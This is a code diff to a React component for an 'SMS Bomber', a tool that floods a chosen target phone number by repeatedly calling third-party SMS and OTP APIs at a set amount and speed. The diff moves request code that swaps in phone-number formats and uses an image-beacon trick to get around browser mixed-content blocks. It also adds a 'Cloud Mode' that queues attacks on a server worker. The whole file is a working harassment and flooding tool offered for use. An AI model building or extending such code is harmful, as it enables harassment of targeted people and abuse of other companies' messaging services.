@@ -1,8 +1,9 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { MessageTemplate, LogEntry, ApiNode, UserProfile } from '../types';
-import { Zap, StopCircle, Terminal, Gauge, Server, CloudLightning } from 'lucide-react';
+import { Zap, StopCircle, Terminal, Gauge, Server, CloudLightning, Wifi, WifiOff, MonitorSmartphone } from 'lucide-react';
 import { addDoc, doc, updateDoc, onSnapshot } from "firebase/firestore"; 
 import { db, collections } from '../firebase';
+import { executeAttackNode } from '../services/attackEngine';
 
 interface SenderProps {
   templates: MessageTemplate[];
@@ -17,11 +18,13 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
   const [amount, setAmount] = useState('');
   const [speed, setSpeed] = useState<'slow' | 'medium' | 'fast'>('medium');
   const [isRunning, setIsRunning] = useState(false);
+  const [isCloudMode, setIsCloudMode] = useState(false); // Cloud Mode State
   const [consoleLogs, setConsoleLogs] = useState<string[]>([]);
   const [progress, setProgress] = useState(0);
   const [stats, setStats] = useState({ success: 0, fail: 0 });
+  
+  // Refs for local execution
   const statsRef = useRef({ success: 0, fail: 0 }); 
-
   const abortControllerRef = useRef<AbortController | null>(null);
   const scrollRef = useRef<HTMLDivElement>(null);
   const activeSessionId = useRef<string | null>(null);
@@ -45,86 +48,7 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
     });
   };
 
-  const updateSessionInDb = async (final = false) => {
-    if (activeSessionId.current && db) {
-        try {
-            const sessionRef = doc(db, 'active_sessions', activeSessionId.current);
-            await updateDoc(sessionRef, {
-                sent: statsRef.current.success,
-                failed: statsRef.current.fail,
-                lastUpdate: new Date(),
-                status: final ? 'completed' : 'running'
-            });
-        } catch (e) {
-            console.error("Sync failed", e);
-        }
-    }
-  };
-
-  const executeNode = async (node: ApiNode, phone: string, signal: AbortSignal) => {
-      const raw = phone.replace(/^(\+88|88)/, ''); 
-      const p88 = `88${raw}`; 
-      const pp88 = `+88${raw}`; 
-
-      let body = node.body
-        .replace(/{phone}/g, raw)
-        .replace(/{phone_88}/g, p88)
-        .replace(/{phone_p88}/g, pp88);
-      
-      let url = node.url
-        .replace(/{phone}/g, raw)
-        .replace(/{phone_88}/g, p88)
-        .replace(/{phone_p88}/g, pp88);
-
-      let headers = {};
-      try { headers = JSON.parse(node.headers); } catch (e) { }
-
-      const isGet = node.method === 'GET';
-      const isMixedContent = typeof window !== 'undefined' && 
-                             window.location.protocol === 'https:' && 
-                             url.trim().startsWith('http:');
-
-      if (isGet && isMixedContent) {
-          return new Promise<Response>((resolve) => {
-              const img = new Image();
-              const beaconUrl = url + (url.includes('?') ? '&' : '?') + `_t=${Date.now()}`;
-              const finish = () => {
-                  resolve({ status: 200, ok: true, text: async () => "Beacon Sent" } as unknown as Response);
-              };
-              img.onload = finish; img.onerror = finish; img.src = beaconUrl;
-              setTimeout(finish, 3000);
-          });
-      }
-
-      const response = await fetch(url, {
-          method: node.method,
-          headers: headers,
-          body: !isGet ? body : undefined,
-          signal,
-          mode: isGet ? 'no-cors' : 'cors',
-          cache: 'no-store',
-          referrerPolicy: 'no-referrer'
-      });
-      return response;
-  };
-
-  const handleStop = async (remote = false) => {
-    if (abortControllerRef.current) {
-      abortControllerRef.current.abort();
-      abortControllerRef.current = null;
-    }
-    addLog(remote ? ">> STOPPED BY ADMIN" : ">> STOP REQUESTED...");
-    
-    if (activeSessionId.current && db) {
-        try {
-            await updateDoc(doc(db, 'active_sessions', activeSessionId.current), {
-                status: remote ? 'stopped' : 'interrupted',
-                lastUpdate: new Date()
-            });
-        } catch(e) {}
-    }
-  };
-
+  // --- Start Attack ---
   const handleStart = async () => {
     if (isRunning) return;
     if (!phoneNumber) { addLog(">> ERROR: TARGET REQUIRED"); return; }
@@ -150,13 +74,70 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
     statsRef.current = { success: 0, fail: 0 };
     
     addLog(`>> INITIALIZING... TARGET: ${phoneNumber}`);
-    addLog(`>> GATEWAYS: ${activeNodes.length} ACTIVE`);
+    addLog(`>> MODE: ${isCloudMode ? 'CLOUD (SERVER-SIDE)' : 'LOCAL (BROWSER)'}`);
 
-    // 1. Create Session in DB (if online)
+    // --- CLOUD MODE LOGIC ---
+    if (isCloudMode) {
+        if (!db || !currentUser || currentUser.uid.startsWith('guest_')) {
+             addLog(">> ERROR: CLOUD MODE REQUIRES LOGIN & DATABASE.");
+             setIsRunning(false);
+             return;
+        }
+
+        try {
+            addLog(">> UPLOADING TASK TO SERVER...");
+            const docRef = await addDoc(collections.sessions(db), {
+                userId: currentUser.uid,
+                username: currentUser.username,
+                target: phoneNumber,
+                amount: count,
+                sent: 0,
+                failed: 0,
+                status: 'queued', // Important: Queued for Admin to pick up
+                mode: 'cloud',
+                startTime: new Date(),
+                lastUpdate: new Date()
+            });
+            activeSessionId.current = docRef.id;
+            addLog(`>> TASK ID: ${docRef.id.slice(0,8)}`);
+            addLog(">> SERVER: WAITING FOR WORKER...");
+            addLog(">> YOU CAN NOW CLOSE THIS TAB.");
+
+            // Listen to progress updates from the Server (Admin)
+            const unsubscribe = onSnapshot(doc(db, 'active_sessions', docRef.id), (docSnap) => {
+                const data = docSnap.data();
+                if (data) {
+                    setStats({ success: data.sent, fail: data.failed });
+                    const total = data.sent + data.failed;
+                    const pct = Math.min((total / data.amount) * 100, 100);
+                    setProgress(pct);
+                    
+                    if (data.status === 'running' && pct < 100) {
+                        // Optional: Visualize heartbeat
+                    }
+                    if (data.status === 'completed' || data.status === 'stopped') {
+                        addLog(`>> SERVER FINISHED: ${data.status.toUpperCase()}`);
+                        setIsRunning(false);
+                        activeSessionId.current = null;
+                        unsubscribe();
+                    }
+                }
+            });
+            
+            // We do NOT run a loop here. The Admin panel runs it.
+            return; 
+
+        } catch (e) {
+            addLog(">> UPLOAD FAILED. CHECK CONNECTION.");
+            setIsRunning(false);
+            return;
+        }
+    }
+
+    // --- LOCAL MODE LOGIC ---
     let unsubscribe: any = null;
     if (db && currentUser && !currentUser.uid.startsWith('guest_')) {
         try {
-            addLog(">> SYNCING TO CLOUD...");
             const docRef = await addDoc(collections.sessions(db), {
                 userId: currentUser.uid,
                 username: currentUser.username,
@@ -165,23 +146,19 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
                 sent: 0,
                 failed: 0,
                 status: 'running',
+                mode: 'local',
                 startTime: new Date(),
                 lastUpdate: new Date()
             });
             activeSessionId.current = docRef.id;
 
-            // Listen for Remote Stop
             unsubscribe = onSnapshot(doc(db, 'active_sessions', docRef.id), (doc) => {
                 const data = doc.data();
                 if (data && data.status === 'stopped') {
-                    if (abortControllerRef.current) {
-                        handleStop(true);
-                    }
+                    if (abortControllerRef.current) handleStop(true);
                 }
             });
-        } catch (e) {
-            addLog(">> CLOUD SYNC FAILED. RUNNING LOCAL.");
-        }
+        } catch (e) { addLog(">> LOCAL MODE: OFFLINE SYNC"); }
     }
 
     abortControllerRef.current = new AbortController();
@@ -190,35 +167,26 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
     for (let i = 0; i < count; i++) {
       if (signal.aborted) break;
 
-      // Batch requests to all nodes
       const promises = activeNodes.map(async (api) => {
         try {
-          const res = await executeNode(api, phoneNumber, signal);
-          const ok = (res.status >= 200 && res.status < 300) || res.status === 0;
-          
+          const res = await executeAttackNode(api, phoneNumber, signal);
           if (!signal.aborted) {
               statsRef.current = {
-                  success: statsRef.current.success + (ok ? 1 : 0),
-                  fail: statsRef.current.fail + (ok ? 0 : 1)
+                  success: statsRef.current.success + (res.ok ? 1 : 0),
+                  fail: statsRef.current.fail + (res.ok ? 0 : 1)
               };
               setStats({...statsRef.current});
-              addLog(`> [${api.name}] ${res.status === 0 ? 'SENT' : res.status} ${ok ? 'OK' : 'ERR'}`);
+              addLog(`> [${api.name}] ${res.status === 0 ? 'SENT' : res.status} ${res.ok ? 'OK' : 'ERR'}`);
           }
         } catch (e: any) {
-          if (e.name !== 'AbortError') {
-             statsRef.current.fail += 1;
-             setStats({...statsRef.current});
-             const errorMsg = e.message === 'Failed to fetch' ? 'Net Error/CORS' : e.message;
-             addLog(`> [${api.name}] FAILED: ${errorMsg}`);
-          }
+           // handled in engine
         }
       });
 
       await Promise.all(promises);
       
-      // Update DB every 5 iterations or if finished
-      if ((i % 5 === 0 || i === count - 1) && !signal.aborted) {
-          updateSessionInDb();
+      if ((i % 5 === 0 || i === count - 1) && !signal.aborted && activeSessionId.current) {
+           updateSessionInDb();
       }
 
       if (signal.aborted) break;
@@ -226,34 +194,54 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
       if (i < count - 1) await new Promise(r => setTimeout(r, getDelay()));
     }
 
-    // Cleanup
     if (unsubscribe) unsubscribe();
-    await updateSessionInDb(true); // Final status update
+    await updateSessionInDb(true);
     
-    const totalSent = statsRef.current.success;
-    const totalFailed = statsRef.current.fail;
-    const isStopped = signal.aborted;
-
-    addLog(isStopped ? ">> PROCESS ABORTED" : ">> COMPLETE");
-    
-    onSend({
-      id: Date.now().toString(),
-      contactName: 'Target',
-      contactPhone: phoneNumber,
-      message: `Limit: ${count} | OK: ${totalSent} | ERR: ${totalFailed}`, 
-      status: isStopped ? 'queued' : 'sent',
-      timestamp: new Date(),
-    });
-
+    addLog(signal.aborted ? ">> PROCESS ABORTED" : ">> COMPLETE");
     setIsRunning(false);
     activeSessionId.current = null;
     abortControllerRef.current = null;
   };
 
+  const updateSessionInDb = async (final = false) => {
+    if (activeSessionId.current && db) {
+        try {
+            await updateDoc(doc(db, 'active_sessions', activeSessionId.current!), {
+                sent: statsRef.current.success,
+                failed: statsRef.current.fail,
+                lastUpdate: new Date(),
+                status: final ? 'completed' : 'running'
+            });
+        } catch (e) {}
+    }
+  };
+
+  const handleStop = async (remote = false) => {
+    if (isCloudMode && activeSessionId.current && db) {
+        // If Cloud Mode, we just tell server to stop
+        await updateDoc(doc(db, 'active_sessions', activeSessionId.current), { status: 'stopped' });
+        addLog(">> STOP SIGNAL SENT TO SERVER...");
+        return;
+    }
+
+    // Local Mode Stop
+    if (abortControllerRef.current) {
+      abortControllerRef.current.abort();
+      abortControllerRef.current = null;
+    }
+    addLog(remote ? ">> STOPPED BY ADMIN" : ">> STOP REQUESTED...");
+    if (activeSessionId.current && db) {
+        updateDoc(doc(db, 'active_sessions', activeSessionId.current), {
+            status: remote ? 'stopped' : 'interrupted',
+            lastUpdate: new Date()
+        }).catch(() => {});
+    }
+  };
+
   return (
     <div className="p-5 pb-10 space-y-6 animate-fade-in">
       
-      {/* Distinct Page Header for Bomber */}
+      {/* Header */}
       <div className="border-b border-zinc-800 pb-4 flex items-center justify-between">
           <div className="flex items-center gap-3">
             <div className="p-2 bg-red-600 rounded-lg shadow-[0_0_15px_rgba(220,38,38,0.4)]">
@@ -261,20 +249,40 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
             </div>
             <div>
                 <h2 className="text-xl font-black italic tracking-tighter text-white uppercase">SMS Bomber</h2>
-                <p className="text-[10px] text-zinc-500 font-mono-code">V3.5 / HIGH_SPEED_ENGINE</p>
+                <p className="text-[10px] text-zinc-500 font-mono-code">V3.5 / {isCloudMode ? 'CLOUD_ENGINE' : 'LOCAL_ENGINE'}</p>
             </div>
           </div>
           {isRunning && (
               <div className="flex items-center gap-2 px-3 py-1 bg-emerald-500/10 border border-emerald-500/20 rounded-full animate-pulse">
                   <CloudLightning className="w-3 h-3 text-emerald-500" />
-                  <span className="text-[9px] font-bold text-emerald-500 uppercase tracking-widest">Live Sync</span>
+                  <span className="text-[9px] font-bold text-emerald-500 uppercase tracking-widest">{isCloudMode ? 'Server Active' : 'Browser Active'}</span>
               </div>
           )}
       </div>
 
       <div className="space-y-4">
         
-        {/* Number Input */}
+        {/* Mode Switcher */}
+        <div className="grid grid-cols-2 gap-2 bg-zinc-900 p-1 rounded-xl border border-zinc-800">
+           <button 
+             disabled={isRunning}
+             onClick={() => setIsCloudMode(false)}
+             className={`flex flex-col items-center justify-center py-3 rounded-lg transition-all ${!isCloudMode ? 'bg-zinc-800 text-white shadow' : 'text-zinc-500 hover:text-zinc-300'}`}
+           >
+              <MonitorSmartphone className="w-5 h-5 mb-1" />
+              <span className="text-[10px] font-bold uppercase">Browser Mode</span>
+           </button>
+           <button 
+             disabled={isRunning}
+             onClick={() => setIsCloudMode(true)}
+             className={`flex flex-col items-center justify-center py-3 rounded-lg transition-all ${isCloudMode ? 'bg-emerald-600/20 text-emerald-500 border border-emerald-500/30 shadow' : 'text-zinc-500 hover:text-zinc-300'}`}
+           >
+              <Server className="w-5 h-5 mb-1" />
+              <span className="text-[10px] font-bold uppercase">Cloud Mode (Offline)</span>
+           </button>
+        </div>
+
+        {/* Inputs */}
         <div className="space-y-1.5">
            <label className="text-xs font-bold text-zinc-500 uppercase tracking-wide">Target Number</label>
            <input
@@ -289,7 +297,6 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
         </div>
 
         <div className="grid grid-cols-2 gap-4">
-           {/* Amount */}
            <div className="space-y-1.5">
               <label className="text-xs font-bold text-zinc-500 uppercase tracking-wide">Amount</label>
               <input
@@ -301,8 +308,6 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
                 className="w-full bg-zinc-900 border border-zinc-800 rounded-lg px-4 py-3 text-white text-lg font-mono-code focus:border-red-500 outline-none transition-all text-center"
               />
            </div>
-
-           {/* Speed */}
            <div className="space-y-1.5">
                <label className="text-xs font-bold text-zinc-500 uppercase tracking-wide">Speed</label>
                <div className="flex bg-zinc-900 rounded-lg border border-zinc-800 p-1">
@@ -323,10 +328,13 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
         </div>
 
         {/* Info Box */}
-        <div className="p-3 bg-zinc-900/50 border border-zinc-800 rounded-lg flex items-start gap-2 text-zinc-500 text-[10px]">
-           <CloudLightning className="w-4 h-4 text-zinc-400 mt-0.5 shrink-0" />
+        <div className={`p-3 border rounded-lg flex items-start gap-2 text-[10px] ${isCloudMode ? 'bg-emerald-500/5 border-emerald-500/20 text-emerald-500' : 'bg-zinc-900/50 border-zinc-800 text-zinc-500'}`}>
+           {isCloudMode ? <WifiOff className="w-4 h-4 mt-0.5 shrink-0" /> : <Wifi className="w-4 h-4 mt-0.5 shrink-0" />}
            <p className="leading-relaxed">
-             <strong>Cloud Mode:</strong> Session is monitored in real-time. Do not close this tab, or the attack will pause. Background processing is simulated via live-sync.
+             {isCloudMode 
+                ? <strong>Offline Capable:</strong> Request will be sent to the server. You can close this tab or turn off internet after starting.
+                : <strong>Browser Dependent:</strong> Tab must remain open and internet connected to send requests.
+             }
            </p>
         </div>
 
@@ -340,9 +348,9 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
           }`}
         >
           {isRunning ? (
-            <><StopCircle className="w-5 h-5" /> Stop Attack</>
+            <><StopCircle className="w-5 h-5" /> {isCloudMode ? 'Cancel Request' : 'Stop Attack'}</>
           ) : (
-            <><Zap className="w-5 h-5 fill-current" /> Start Attack</>
+            <><Zap className="w-5 h-5 fill-current" /> {isCloudMode ? 'Queue Attack' : 'Start Attack'}</>
           )}
         </button>
       </div>
